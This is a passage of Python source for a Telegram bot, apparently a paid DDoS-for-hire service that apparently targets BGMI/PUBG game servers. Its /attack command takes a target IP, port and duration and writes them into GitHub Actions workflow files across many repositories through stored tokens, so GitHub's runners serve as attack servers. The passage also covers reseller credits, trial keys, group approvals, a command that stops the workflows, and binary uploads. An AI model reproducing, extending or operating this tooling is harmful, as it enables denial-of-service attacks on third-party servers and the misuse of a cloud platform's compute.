                        days_left = int((expiry_time - time.time()) / (24 * 3600))
                        group_access = f"✅ 𝐘𝐄𝐒 ({days_left} days left)"
                except:
                    group_access = "✅ 𝐘𝐄𝐒"
    
    await update.message.reply_text(
        f"📋 **𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍**\n"
        "────────────────────\n"
        f"• **𝐑𝐨𝐥𝐞:** {role}\n"
        f"• **𝐔𝐬𝐞𝐫 𝐈𝐃:** `{user_id}`\n"
        f"• **𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:** @{update.effective_user.username or 'No username'}\n"
        f"• **𝐄𝐱𝐩𝐢𝐫𝐲:** {expiry}\n"
        f"• **𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {remaining_attacks}/{MAX_ATTACKS}\n"
        "────────────────────\n"
        f"**𝐃𝐌 𝐀𝐜𝐜𝐞𝐬𝐬:** {'✅ 𝐘𝐄𝐒' if can_user_attack(user_id) else '❌ 𝐍𝐎'}\n"
        f"**𝐆𝐫𝐨𝐮𝐩 𝐀𝐜𝐜𝐞𝐬𝐬:** {group_access}"
    )

# ========== ADMIN COMMAND ==========
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if user is admin, owner, or reseller
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins, owners, and resellers."
        )
        return
    
    admin_commands = (
        "👑 **𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐋𝐈𝐒𝐓** 👑\n"
        "────────────────────\n"
        "**𝐔𝐒𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:**\n"
        "• /add <id> <days> - Add user\n"
        "• /remove <id> - Remove user\n"
        "• /userslist - Approved users list\n"
        "• /approveuserslist - Pending requests\n\n"
        
        "**𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓𝐒:**\n"
        "• /pricelist - User price list\n"
        "• /resellerpricelist - Reseller price list\n\n"
        
        "**𝐆𝐑𝐎𝐔𝐏 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:**\n"
        "• /approvegroup <group_id> <days> - Approve group\n"
        "• /removegroup <group_id> - Remove group\n"
        "• /grouplist - Approved groups list\n"
        "• /listgrp - All groups list\n\n"
        
        "**𝐕𝐈𝐄𝐖 𝐋𝐈𝐒𝐓𝐒:**\n"
        "• /ownerlist - Owners list\n"
        "• /adminlist - Admins list\n"
        "• /resellerlist - Resellers list\n\n"
        
        "**𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒:**\n"
        "• /maintenance <on/off> - Toggle maintenance mode\n"
        "• /setcooldown <seconds> - Set cooldown time\n"
        "• /setmaxattack <number> - Set max attacks per user\n"
        "• /gentrailkey <hours> - Generate trial key\n"
        "• /removexpiredtoken - Remove expired tokens\n\n"
        
        "**𝐓𝐎𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 (𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑𝐒):**\n"
        "• /addtoken <github_token> - Add GitHub token\n"
        "• /tokens - View all tokens\n"
        "• /removetoken <number> - Remove token\n\n"
        
        "**𝐁𝐈𝐍𝐀𝐑𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 (𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑𝐒):**\n"
        "• /binary_upload - Upload binary file\n\n"
        
        "**𝐎𝐖𝐍𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 (𝐎𝐍𝐋𝐘 𝐏𝐑𝐈𝐌𝐀𝐑𝐘 𝐎𝐖𝐍𝐄𝐑𝐒):**\n"
        "• /addowner <user_id> <username> - Add owner\n"
        "• /deleteowner <user_id> - Delete owner\n\n"
        
        "**𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 (𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑𝐒):**\n"
        "• /addreseller <user_id> <credits> <username> - Add reseller\n"
        "• /removereseller <user_id> - Remove reseller\n\n"
        
        "**𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 (𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑𝐒):**\n"
        "• /broadcast - Send broadcast message\n"
        "────────────────────\n"
        "**𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍 𝐋𝐄𝐕𝐄𝐋𝐒:**\n"
        "👑 Owner: All commands\n"
        "🛡️ Admin: Most commands\n"
        "💰 Reseller: Basic admin commands\n"
        "────────────────────\n"
        "Use /help for user commands"
    )
    
    await update.message.reply_text(admin_commands)

# ========== ATTACK COMMANDS ==========
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not can_user_attack(user_id, chat_id):
        if update.effective_chat.type == "private":
            await update.message.reply_text(
                "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                "────────────────────\n"
                "You are not authorized to attack in DM.\n"
                "To use bot in DM, you need access.\n"
                "Use /start to request access or join an approved group."
            )
        else:
            if not can_use_in_group(chat_id):
                await update.message.reply_text(
                    "🚫 **𝐁𝐎𝐓 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**\n"
                    "────────────────────\n"
                    "This group is not approved to use CLOUD Bot.\n"
                    "Contact admin to get this group approved."
                )
            else:
                await update.message.reply_text(
                    "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                    "────────────────────\n"
                    "You need to be a member of this approved group to use the bot.\n"
                    "Just being in the group is enough - no individual access needed!"
                )
        return
    
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /attack <ip> <port> <time>\n\n"
            "Example: /attack 1.1.1.1 80 60"
        )
        return
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄**\n"
            "────────────────────\n"
            "No servers available. Contact admin."
        )
        return
    
    ip, port, time_val = context.args
    
    if not is_valid_ip(ip):
        await update.message.reply_text(
            "⚠️ **𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏**\n"
            "────────────────────\n"
            "IPs starting with '15' or '96' not accepted."
        )
        return
    
    method, method_name = get_attack_method(ip)
    if method is None:
        await update.message.reply_text(
            f"⚠️ **𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐈𝐏**\n"
            "────────────────────\n"
            f"{method_name}"
        )
        return
    
    try:
        attack_duration = int(time_val)
        if attack_duration <= 0:
            await update.message.reply_text(
                "❌ **𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐓𝐈𝐌𝐄**\n"
                "────────────────────\n"
                "Time must be positive number"
            )
            return
    except ValueError:
        await update.message.reply_text(
            "❌ **𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐓𝐈𝐌𝐄**\n"
            "────────────────────\n"
            "Time must be number"
        )
        return
    
    start_attack(ip, port, time_val, user_id, method)
    
    progress_msg = await update.message.reply_text(
        "⏳ **𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓... 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆**"
    )
    
    success_count = 0
    fail_count = 0
    
    threads = []
    results = []
    
    def update_single_token(token_data):
        try:
            result = update_yml_file(
                token_data['token'], 
                token_data['repo'], 
                ip, port, time_val, method
            )
            results.append((token_data['username'], result))
        except Exception as e:
            results.append((token_data['username'], False))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=update_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, success in results:
        if success:
            success_count += 1
        else:
            fail_count += 1
    
    # Check remaining attacks
    user_id_str = str(user_id)
    remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)
    
    message = (
        f"⚡ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n"
        "────────────────────\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Time: `{time_val}s`\n"
        f"📊 Status: Running\n"
        f"🛠️ Servers: `{success_count}`\n"
        f"📊 Method: {method_name}\n"
        f"⏳ Cooldown: {COOLDOWN_DURATION}s after attack\n"
        f"⚡ Remaining Attacks: {remaining_attacks}/{MAX_ATTACKS}\n\n"
        "📊 /status to check status\n\n"
        "📸 Give feedback after every attack"
    )
    
    await progress_msg.edit_text(message)
    
    # Set feedback requirement (only for approved users, not group members)
    if is_approved_user(user_id) or is_owner(user_id) or is_admin(user_id) or is_reseller(user_id):
        require_feedback(user_id)
    
    def monitor_attack_completion():
        time.sleep(attack_duration)
        finish_attack()
        logger.info(f"Attack completed automatically after {attack_duration} seconds")
    
    monitor_thread = threading.Thread(target=monitor_attack_completion)
    monitor_thread.daemon = True
    monitor_thread.start()

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not can_user_attack(user_id, chat_id):
        if update.effective_chat.type == "private":
            await update.message.reply_text(
                "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                "────────────────────\n"
                "You are not authorized to use bot in DM.\n"
                "To use bot in DM, you need access.\n"
                "Use /start to request access or join an approved group."
            )
        else:
            if not can_use_in_group(chat_id):
                await update.message.reply_text(
                    "🚫 **𝐁𝐎𝐓 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**\n"
                    "────────────────────\n"
                    "This group is not approved to use CLOUD Bot.\n"
                    "Contact admin to get this group approved."
                )
            else:
                await update.message.reply_text(
                    "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                    "────────────────────\n"
                    "You need to be a member of this approved group to use the bot.\n"
                    "Just being in the group is enough - no individual access needed!"
                )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            "⚡ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆**\n"
            "────────────────────\n"
            f"🎯 Target: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ Time: `{attack_status['elapsed']}s`\n"
            f"⌛ Remaining: `{attack_status['remaining']}s`\n"
            f"📊 Method: `{attack['method']}`"
        )
    
    elif attack_status["status"] == "cooldown":
        message = (
            "⏳ **𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍**\n"
            "────────────────────\n"
            f"⏳ Remaining: `{attack_status['remaining_cooldown']}s`\n"
            f"⏰ Next Attack: in `{attack_status['remaining_cooldown']}s`"
        )
    
    else:
        # Check if user needs feedback (only for approved users, not group members)
        if str(user_id) in user_waiting_for_feedback and (is_approved_user(user_id) or is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
            message = (
                "📸 **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃**\n"
                "────────────────────\n"
                "Please send BGMI related photo\n"
                "so you can use bot.\n\n"
                "✅ Send any BGMI/PUBG photo\n"
                "❌ Other photos not accepted"
            )
        else:
            message = (
                "✅ **𝐑𝐄𝐀𝐃𝐘**\n"
                "────────────────────\n"
                "No attack running.\n"
                "You can start new attack."
            )
    
    await update.message.reply_text(message)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not can_user_attack(user_id, chat_id):
        if update.effective_chat.type == "private":
            await update.message.reply_text(
                "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                "────────────────────\n"
                "You are not authorized to use bot in DM.\n"
                "To use bot in DM, you need access.\n"
                "Use /start to request access or join an approved group."
            )
        else:
            if not can_use_in_group(chat_id):
                await update.message.reply_text(
                    "🚫 **𝐁𝐎𝐓 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**\n"
                    "────────────────────\n"
                    "This group is not approved to use CLOUD POWERD Bot.\n"
                    "Contact admin to get this group approved."
                )
            else:
                await update.message.reply_text(
                    "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
                    "────────────────────\n"
                    "You need to be a member of this approved group to use the bot.\n"
                    "Just being in the group is enough - no individual access needed!"
                )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] != "running":
        await update.message.reply_text(
            "❌ **𝐍𝐎 𝐀𝐂𝐓𝐈𝐕𝐄 𝐀𝐓𝐓𝐀𝐂𝐊**\n"
            "────────────────────\n"
            "No attack running."
        )
        return
    
    if not github_tokens:
        await update.message.reply_text(
            "❌ **𝐍𝐎 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄**\n"
            "────────────────────\n"
            "No servers added."
        )
        return
    
    progress_msg = await update.message.reply_text(
        "🛑 **𝐒𝐓𝐎𝐏𝐏𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊...**"
    )
    
    total_stopped = 0
    success_count = 0
    
    threads = []
    results = []
    
    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(
                token_data['token'], 
                token_data['repo']
            )
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))
    
    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1
    
    stop_attack()
    
    message = (
        f"🛑 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃**\n"
        "────────────────────\n"
        f"✅ Workflows Stopped: {total_stopped}\n"
        f"✅ Servers: {success_count}/{len(github_tokens)}\n"
        f"⏳ Cooldown: {COOLDOWN_DURATION}s"
    )
    
    await progress_msg.edit_text(message)

# ========== PHOTO HANDLER (FEEDBACK SYSTEM) ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if user needs to give feedback (only for approved users, not group members)
    if str(user_id) in user_waiting_for_feedback and (is_approved_user(user_id) or is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        # Check caption for BGMI keywords
        caption = update.message.caption or ""
        
        if is_bgmi_photo(caption):
            # Clear feedback requirement
            clear_feedback_requirement(user_id)
            
            await update.message.reply_text(
                "✅ **𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐀𝐂𝐂𝐄𝐏𝐓𝐄𝐃!**\n"
                "────────────────────\n"
                "Thanks for BGMI photo.\n"
                "Now you can start another attack!\n\n"
                "Use /attack to start new attack"
            )
        else:
            # Increment attempts
            user_waiting_for_feedback[str(user_id)]["attempts"] += 1
            save_feedback_users(user_waiting_for_feedback)
            
            await update.message.reply_text(
                "❌ **𝐖𝐑𝐎𝐍𝐆 𝐏𝐇𝐎𝐓𝐎**\n"
                "────────────────────\n"
                "Please send BGMI related photo.\n"
                "Example: PUBG, BGMI gameplay screenshots"
            )
    else:
        # User doesn't need feedback, ignore photo
        pass

# ========== GROUP MANAGEMENT COMMANDS ==========
async def approvegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only admins can approve groups."
        )
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /approvegroup <group_id> <days>\n"
            "Example: /approvegroup -100123456 30\n\n"
            "Use 0 for lifetime approval"
        )
        return
    
    try:
        group_id = int(context.args[0])
        days = int(context.args[1])
        
        if days < 0 or days > 3650:  # Max 10 years
            await update.message.reply_text("❌ Days must be between 0 and 3650")
            return
        
        expiry = approve_group(group_id, days, user_id)
        
        if expiry == "LIFETIME":
            expiry_text = "LIFETIME"
        else:
            expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry))
            expiry_text = expiry_date
        
        await update.message.reply_text(
            f"✅ **𝐆𝐑𝐎𝐔𝐏 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃**\n"
            "────────────────────\n"
            f"Group ID: `{group_id}`\n"
            f"Duration: {days} days\n"
            f"Expiry: {expiry_text}\n"
            f"Approved by: `{user_id}`\n\n"
            "✅ **𝐍𝐎𝐖 𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐁𝐎𝐓 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏!**\n"
            "No individual access needed - just join the group!"
        )
        
        # Try to notify group
        try:
            await context.bot.send_message(
                chat_id=group_id,
                text=f"✅ **𝐆𝐑𝐎𝐔𝐏 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃**\n────────────────────\nThis group is now approved to use CLOUD POWERD Bot!\n\n🎉 **𝐍𝐎𝐖 𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐄 𝐁𝐎𝐓!**\nNo individual access needed - just use commands in this group!\n\nApproval expires: {expiry_text}"
            )
        except:
            pass
        
    except ValueError:
        await update.message.reply_text("❌ Wrong group ID or days")

async def removegroup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only admins can remove groups."
        )
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /removegroup <group_id>\n"
            "Example: /removegroup -100123456"
        )
        return
    
    try:
        group_id = int(context.args[0])
        
        if remove_group_approval(group_id):
            await update.message.reply_text(
                f"✅ **𝐆𝐑𝐎𝐔𝐏 𝐑𝐄𝐌𝐎𝐕𝐄𝐃**\n"
                "────────────────────\n"
                f"Group ID: `{group_id}`\n"
                f"Removed by: `{user_id}`\n\n"
                "🚫 **𝐁𝐎𝐓 𝐍𝐎 𝐋𝐎𝐍𝐆𝐄𝐑 𝐖𝐎𝐑𝐊𝐒 𝐈𝐍 𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏**"
            )
            
            # Try to notify group
            try:
                await context.bot.send_message(
                    chat_id=group_id,
                    text="🚫 **𝐆𝐑𝐎𝐔𝐏 𝐀𝐏𝐏𝐑𝐎𝐕𝐀𝐋 𝐑𝐄𝐌𝐎𝐕𝐄𝐃**\n────────────────────\nThis group is no longer approved to use CLOUD POWERD Bot.\n\nAll members now need individual access to use the bot."
                )
            except:
                pass
        else:
            await update.message.reply_text(
                "❌ **𝐆𝐑𝐎𝐔𝐏 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃**\n"
                "────────────────────\n"
                "This group is not in approved list."
            )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong group ID")

async def grouplist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "Only admins can view group list."
        )
        return
    
    if not approved_groups:
        await update.message.reply_text("📭 No approved groups")
        return
    
    groups_list = "👥 **𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒 𝐋𝐈𝐒𝐓**\n────────────────────\n"
    count = 1
    for group_id, group_info in approved_groups.items():
        approved_by = group_info.get('approved_by', 'Unknown')
        days = group_info.get('days', '?')
        expiry = group_info.get('expiry', '?')
        
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    remaining = f"{days_left} days"
            except:
                remaining = "Unknown"
        
        groups_list += f"{count}. `{group_id}` - {days} days | Remaining: {remaining}\n  Approved by: `{approved_by}`\n"
        count += 1
    
    groups_list += f"\n📊 **𝐓𝐎𝐓𝐀𝐋 𝐆𝐑𝐎𝐔𝐏𝐒:** {len(approved_groups)}\n"
    groups_list += "✅ **𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐁𝐎𝐓 𝐈𝐍 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒**"
    await update.message.reply_text(groups_list)

# ========== REDEEM TRIAL KEY ==========
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /redeem <key>\n"
            "Example: /redeem TRL-ABCD-1234-EFGH"
        )
        return
    
    key = context.args[0].upper()
    
    # Check if user already has access
    if can_user_attack(user_id):
        await update.message.reply_text(
            "⚠️ **𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐇𝐀𝐕𝐄 𝐀𝐂𝐂𝐄𝐒𝐒**\n"
            "────────────────────\n"
            "You already have bot access. No need to redeem trial key."
        )
        return
    
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        await update.message.reply_text(
            f"✅ **𝐓𝐑𝐈𝐀𝐋 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!**\n"
            "────────────────────\n"
            f"{message}\n\n"
            "Now you can use /start to access bot in DM.\n"
            "Or join an approved group to use bot there!"
        )
    else:
        await update.message.reply_text(
            f"❌ **𝐑𝐄𝐃𝐄𝐌𝐏𝐓𝐈𝐎𝐍 𝐅𝐀𝐈𝐋𝐄𝐃**\n"
            "────────────────────\n"
            f"{message}"
        )

# ========== EXISTING ADMIN COMMANDS ==========
async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins/resellers."
        )
        return
    
    # Check if reseller has enough credits
    if is_reseller(user_id):
        reseller_data = resellers.get(str(user_id), {})
        credits = reseller_data.get('credits', 0)
        if credits <= 0:
            await update.message.reply_text(
                "❌ **𝐍𝐎 𝐂𝐑𝐄𝐃𝐈𝐓𝐒 𝐋𝐄𝐅𝐓**\n"
                "────────────────────\n"
                "You don't have credits to add user."
            )
            return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /add <id> <days>\n"
            "Example: /add 123456 7"
        )
        return
    
    try:
        new_user_id = int(context.args[0])
        days = int(context.args[1])
        
        # Check if reseller has enough credits
        if is_reseller(user_id):
            if days > 7:  # Resellers can only add up to 7 days
                days = 7
                await update.message.reply_text("⚠️ Resellers can only add up to 7 days. Setting to 7 days.")
            
            reseller_data = resellers.get(str(user_id), {})
            required_credits = days
            if reseller_data.get('credits', 0) < required_credits:
                await update.message.reply_text(
                    f"❌ **𝐈𝐍𝐒𝐔𝐅𝐅𝐈𝐂𝐈𝐄𝐍𝐓 𝐂𝐑𝐄𝐃𝐈𝐓𝐒**\n"
                    "────────────────────\n"
                    f"You need {required_credits} credits, but you have only {reseller_data.get('credits', 0)}"
                )
                return
            
            # Deduct credits
            reseller_data['credits'] = reseller_data.get('credits', 0) - required_credits
            reseller_data['total_added'] = reseller_data.get('total_added', 0) + 1
            resellers[str(user_id)] = reseller_data
            save_resellers(resellers)
        
        # Remove from pending
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)
        
        # Calculate expiry
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)
        
        # Add to approved
        approved_users[str(new_user_id)] = {
            "username": update.effective_user.username or f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃!**\n────────────────────\nYour access approved for {days} days.\nNow you can use bot in DM!\n\nUse /start to access bot."
            )
        except:
            pass
        
        await update.message.reply_text(
            f"✅ **𝐔𝐒𝐄𝐑 𝐀𝐃𝐃𝐄𝐃**\n"
            "────────────────────\n"
            f"User ID: `{new_user_id}`\n"
            f"Duration: {days} days\n"
            f"Added by: `{user_id}`\n\n"
            "✅ User can now use bot in DM\n"
            "👥 User can also use bot in approved groups"
        )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID or days")

async def remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🚫 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃**\n"
            "────────────────────\n"
            "This command is only for admins."
        )
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ **𝐖𝐑𝐎𝐍𝐆 𝐒𝐘𝐍𝐓𝐀𝐗**\n"
            "────────────────────\n"
            "Syntax: /remove <user_id>\n"
            "Example: /remove 12345678"
        )
        return
    
    try:
        user_to_remove = int(context.args[0])
        user_to_remove_str = str(user_to_remove)
        
        removed = False
        
        # Remove from approved users
        if user_to_remove_str in approved_users:
            del approved_users[user_to_remove_str]
            save_approved_users(approved_users)
            removed = True
        
        # Remove from pending users
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != user_to_remove_str]
        save_pending_users(pending_users)
        
        # Reset attack count
        if user_to_remove_str in user_attack_counts:
            del user_attack_counts[user_to_remove_str]
            save_user_attack_counts(user_attack_counts)
        
        if removed:
            await update.message.reply_text(
                f"✅ **𝐔𝐒𝐄𝐑 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐌𝐎𝐕𝐄𝐃**\n"
                "────────────────────\n"
                f"User ID: `{user_to_remove}`\n"
                f"Removed by: `{user_id}`\n\n"
                "🚫 User can no longer use bot in DM\n"
                "👥 User can still use bot in approved groups"
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=user_to_remove,
                    text="🚫 **𝐘𝐎𝐔𝐑 𝐃𝐌 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐌𝐎𝐕𝐄𝐃**\n────────────────────\nYour CLOUD POWERD Bot DM access has been removed.\n\nYou can still use the bot in approved groups!"
                )
            except:
                pass
        else:
            await update.message.reply_text(
                f"❌ **𝐔𝐒𝐄𝐑 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃**\n"
                "────────────────────\n"
                f"User ID `{user_to_remove}` not found in approved users."
            )
        
    except ValueError:
        await update.message.reply_text("❌ Wrong user ID")

async def userslist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
